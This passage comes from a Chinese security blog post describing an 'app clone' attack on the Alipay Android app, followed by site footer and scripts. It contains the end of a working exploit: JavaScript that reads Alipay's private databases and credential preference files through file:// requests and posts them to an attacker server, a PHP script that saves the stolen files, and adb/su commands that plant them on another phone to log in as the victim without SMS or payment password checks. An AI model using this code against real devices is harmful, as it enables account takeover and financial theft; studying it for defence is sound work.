class="line"></span><br><span class="line">// send POST Request</span><br><span class="line">function sendPostRequest(url,data,headers,callback)&#123;</span><br><span class="line"></span><br><span class="line">    var xhr  = createXHR();</span><br><span class="line">    xhr.onload = function()&#123;</span><br><span class="line">        callback(xhr.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">    xhr.open(&apos;POST&apos;,url,false);</span><br><span class="line">    if(typeof(headers)==&apos;object&apos;)&#123;</span><br><span class="line">        for(var index in headers)&#123;</span><br><span class="line">            if(typeof(headers[index])!=&apos;function&apos;)&#123;</span><br><span class="line">                xhr.setRequestHeader(index,headers[index]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    xhr.send(data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// send GET Request to read file and return base64(file_content)</span><br><span class="line">function sendGetRequestForB64File(url, filename, callback) &#123;</span><br><span class="line">    var xhr = createXHR();</span><br><span class="line">    xhr.onload = function() &#123;</span><br><span class="line">    var reader = new FileReader();</span><br><span class="line">        reader.onloadend = function() &#123;</span><br><span class="line">            var result = reader.result;</span><br><span class="line">            var data = result.substr(result.search(&apos;base64,&apos;) + &apos;base64,&apos;.length,result.length);</span><br><span class="line">            data = data.replace(/\+/g,&apos;-&apos;).replace(/\//g, &apos;_&apos;);</span><br><span class="line">            callback(filename, data);</span><br><span class="line">        &#125;</span><br><span class="line">        reader.readAsDataURL(xhr.response);</span><br><span class="line">    &#125;;</span><br><span class="line">    xhr.open(&apos;GET&apos;, url);</span><br><span class="line">    xhr.responseType = &apos;blob&apos;;</span><br><span class="line">    xhr.send();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var files = Array(</span><br><span class="line">    &apos;databases/alipayclient.db&apos;,</span><br><span class="line">    &apos;databases/alipayclient.db-journal&apos;,</span><br><span class="line">    &apos;files/SGMANAGER_DATA2&apos;,</span><br><span class="line">    &apos;shared_prefs/alipay_tid_storage.xml&apos;,</span><br><span class="line">    &apos;shared_prefs/secuitySharedDataStore.xml&apos;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">var base_path = &apos;file:///data/data/com.eg.android.AlipayGphone/&apos;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for(var each in files)&#123;</span><br><span class="line">    var file_path = base_path + files[each]</span><br><span class="line">    sendGetRequestForB64File(file_path,files[each],function(filename, response)&#123;</span><br><span class="line">        sendPostRequest(</span><br><span class="line">            server,</span><br><span class="line">            &apos;name=&apos; + escape(filename) + &apos;&amp;&apos; + &apos;content=&apos; + escape(response),</span><br><span class="line">            &#123;&quot;Content-type&quot; : &quot;application/x-www-form-urlencoded&quot;&#125;,</span><br><span class="line">            function(a)&#123;&#125;</span><br><span class="line">        );</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>recv.php：</p>
+<blockquote>
+<p>因为我是在内网接收的数据，所以测试时为了方便直接接收参数就写文件了<br>大佬们把这个脚本丢到自己服务器上测试的时候小心一点，可能会被别人写shell XD</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">function base64url_decode($data) &#123; </span><br><span class="line">    return base64_decode(str_pad(strtr($data, &apos;-_&apos;, &apos;+/&apos;), strlen($data) % 4, &apos;=&apos;, STR_PAD_RIGHT)); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">file_put_contents(&apos;/home/dlive/Desktop/exp/clone_attack/&apos;.$_POST[&apos;name&apos;], base64url_decode($_POST[&apos;content&apos;]));</span><br></pre></td></tr></table></figure>
+<p>攻击者将从被攻击者手机上窃取的文件拷贝到自己手机上：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">adb -s 049219950024a175 install ~/Desktop/clone/apk/alipay.apk</span><br><span class="line">adb -s 049219950024a175 shell</span><br><span class="line">su</span><br><span class="line">adb -s 049219950024a175 push ~/Desktop/clone/exp/clone_attack/ /sdcard/</span><br><span class="line">cp -R /sdcard/clone_attack/* /data/data/com.eg.android.AlipayGphone/</span><br><span class="line">chmod -R 777 /data/data/com.eg.android.AlipayGphone/</span><br><span class="line">然后打开app即可</span><br></pre></td></tr></table></figure>
+<p>攻击者通过拷贝攻击，无需回答身份验证问题，无需短信验证，即可登录受害者账户，并且无需付款密码即可使用付款码</p>
+<p>具体攻击操作可见视频演示（不是很会处理视频，导致视频质量有点差，希望大家不要介意）</p>
+<p><a href="https://youtu.be/o6IbSAJUUYo" target="_blank" rel="noopener">https://youtu.be/o6IbSAJUUYo</a></p>
+<h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>总的来说这个漏洞原理比较简单，克隆攻击所用到的漏洞类型都是已经在网上被曝出过的，</p>
+<p>但是为什么还有如此多的app存在被这种攻击方式攻击的风险，这一点是值得思考的。</p>
+<p>整个漏洞利用过程全靠自己猜想验证，如果哪里描述的不准确欢迎交流指正。</p>
+<h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><ol>
+<li>关于Android平台WebView控件存在跨域访问高危漏洞的安全公告<br><a href="http://www.cnvd.org.cn/webinfo/show/4365?from=timeline&amp;isappinstalled=0" target="_blank" rel="noopener">http://www.cnvd.org.cn/webinfo/show/4365?from=timeline&amp;isappinstalled=0</a></li>
+<li>“应用克隆”攻击模型<br><a href="https://mp.weixin.qq.com/s/pQqOLQS_hWfv8btYpYK1xQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/pQqOLQS_hWfv8btYpYK1xQ</a></li>
+<li>Android安全开发之浅谈网页打开APP<br><a href="https://yq.aliyun.com/articles/57088" target="_blank" rel="noopener">https://yq.aliyun.com/articles/57088</a></li>
+<li>Webview跨源攻击分析<br><a href="http://blogs.360.cn/360mobile/2014/09/22/webview%E8%B7%A8%E6%BA%90%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">http://blogs.360.cn/360mobile/2014/09/22/webview%E8%B7%A8%E6%BA%90%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/</a></li>
+<li>Attack Your Android Apps By Webview<br><a href="http://blog.knownsec.com/2013/03/attack-your-android-apps-by-webview/" target="_blank" rel="noopener">http://blog.knownsec.com/2013/03/attack-your-android-apps-by-webview/</a></li>
+<li>Andorid Intent 与 Chrome<br><a href="https://developer.chrome.com/multidevice/android/intents?spm=5176.100239.blogcont57088.9.1c29be50KIPvAG" target="_blank" rel="noopener">https://developer.chrome.com/multidevice/android/intents?spm=5176.100239.blogcont57088.9.1c29be50KIPvAG</a></li>
+</ol>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/01/15/一点小牢骚/" rel="next" title="一点小牢骚">
+                <i class="fa fa-chevron-left"></i> 一点小牢骚
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2200/11/07/关于本博客/" rel="prev" title="关于本博客">
+                关于本博客 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        
+  <div class="bdsharebuttonbox">
+    <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+    <a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
+    <a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+    <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
+    <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+    <a href="#" class="bds_tieba" data-cmd="tieba" title="分享到百度贴吧"></a>
+    <a href="#" class="bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+    <a href="#" class="bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+    <a href="#" class="bds_more" data-cmd="more"></a>
+    <a class="bds_count" data-cmd="count"></a>
+  </div>
+  <script>
+    window._bd_share_config = {
+      "common": {
+        "bdText": "",
+        "bdMini": "2",
+        "bdMiniList": false,
+        "bdPic": ""
+      },
+      "share": {
+        "bdSize": "16",
+        "bdStyle": "0"
+      },
+      "image": {
+        "viewList": ["tsina", "douban", "sqq", "qzone", "weixin", "twi", "fbook"],
+        "viewText": "分享到：",
+        "viewSize": "16"
+      }
+    }
+  </script>
+
+<script>
+  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+      <div id="sidebar-dimmer"></div>
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="https://qlogo1.store.qq.com/qzone/1192901808/1192901808/100?1514520393"
+                alt="T.G." />
+            
+              <p class="site-author-name" itemprop="name">T.G.</p>
+              <p class="site-description motion-element" itemprop="description">本人弱鸡web狗一枚，性格内向，有时脾气暴躁，但有探索技术的心，大佬给点建议，谢谢</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">分类</span>
+                
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/TUGOhost" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:tugohost@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://twitter.com/TGhost" target="_blank" title="Twitter">
+                      
+                        <i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-前言"><span class="nav-number">1.</span> <span class="nav-text">0x01 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-攻击阶段1-URL-Scheme攻击"><span class="nav-number">2.</span> <span class="nav-text">0x01 攻击阶段1 - URL Scheme攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-攻击阶段2-Webview跨域攻击"><span class="nav-number">3.</span> <span class="nav-text">0x02 攻击阶段2 - Webview跨域攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-攻击阶段3-克隆攻击"><span class="nav-number">4.</span> <span class="nav-text">0x03 攻击阶段3 - 克隆攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-完整的exp"><span class="nav-number">5.</span> <span class="nav-text">0x04 完整的exp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-总结"><span class="nav-number">6.</span> <span class="nav-text">0x05 总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-参考"><span class="nav-number">7.</span> <span class="nav-text">0x06 参考</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">T.G.</span>
+
+  
+</div>
+
+
+
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.3</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery_lazyload/1.9.7/jquery.lazyload.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/velocity/1.2.1/velocity.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/velocity/1.2.1/velocity.ui.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/three.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/canvas_sphere.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.3"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  
+  
+  <link rel="stylesheet" href="/lib/algolia-instant-search/instantsearch.min.css">
+
+  
+  
+  <script src="/lib/algolia-instant-search/instantsearch.min.js"></script>
+  
+
+  <script src="/js/src/algolia-search.js?v=5.1.3"></script>
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("PmyI1NjIRxvWeUcKKUqWCCMX-gzGzoHsz", "40qqfDrLEiqa1Wnsj9VA6y9m");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
